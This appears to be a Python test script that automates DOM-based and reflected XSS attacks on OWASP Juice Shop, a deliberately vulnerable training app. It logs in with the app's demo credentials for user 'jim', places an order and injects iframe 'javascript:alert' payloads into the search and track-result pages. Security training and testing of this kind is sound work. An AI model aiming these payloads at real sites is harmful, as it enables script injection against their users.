import requests as r
import json
import time
import random
from config import config
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException
except Exception:
    print("[!] Selenium not installed or properly configured!")
    exit()

options = Options()
options.add_argument('headless')
options.add_argument('no-sandbox')
options.add_argument('disable-dev-shm-usage')
options.add_argument('disable-infobars')
options.add_argument('disable-background-networking')
options.add_argument('disable-default-apps')
options.add_argument('disable-extensions')
options.add_argument('disable-gpu')
options.add_argument('disable-sync')
options.add_argument('disable-translate')
options.add_argument('hide-scrollbars')
options.add_argument('metrics-recording-only')
options.add_argument('mute-audio')
options.add_argument('no-first-run')
options.add_argument('dns-prefetch-disable')
options.add_argument('safebrowsing-disable-auto-update')
options.add_argument('media-cache-size=1')
options.add_argument('disk-cache-size=1')
options.add_argument('user-agent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0')
browser = webdriver.Chrome(service=Service(executable_path=r'/usr/bin/chromedriver'), options=options)

# https://pwning.owasp-juice.shop/appendix/solutions.html#perform-a-dom-xss-attack
def test_dom_xss():
    browser.get(f'{config.JUICE_URL}/#/search?q=apple')
    time.sleep(random.random() + random.randint(2,4))
    browser.get(f'{config.JUICE_URL}/#/search?q=<script>alert(1)</script>')
    time.sleep(random.random() + random.randint(2,4))
    browser.get(f'{config.JUICE_URL}/#/search?q=<iframe src="javascript:alert(`xss`)">')
    
    WebDriverWait(browser, 3).until(EC.alert_is_present(), "Timed out waiting for popup")
    alert = browser.switch_to.alert
    alert.accept() # should throw an exception if it fails

def test_reflected_xss():
    login = {
        'email': 'jim@juice-sh.op',
        'password': 'ncc-1701'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': f'{config.JUICE_URL}/',
        'Connection': 'keep-alive',
        'Referer': f'{config.JUICE_URL}/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    res = r.post(f'{config.JUICE_URL}/rest/user/login', headers=headers, json=login)
    token = json.loads(res.text.strip())['authentication']['token']
    headers['Authorization'] = f"Bearer {token}"
    time.sleep(random.random() + random.randint(2,4))

    res = r.post(f'{config.JUICE_URL}/checkout', headers=headers, json={"couponData":"bnVsbA==","orderDetails":{"paymentId":"5","addressId":"4","deliveryMethodId":"1"}})
    time.sleep(random.random() + random.randint(2,4))

    r.get(f'{config.JUICE_URL}/#/order-history')
    browser.get(f'{config.JUICE_URL}/#/track-result?id=<iframe src%3D"javascript:alert(`xss`)">')
    WebDriverWait(browser, 3).until(EC.alert_is_present(), "Timed out waiting for popup")
    alert = browser.switch_to.alert
    alert.accept() # should throw an exception if it fails
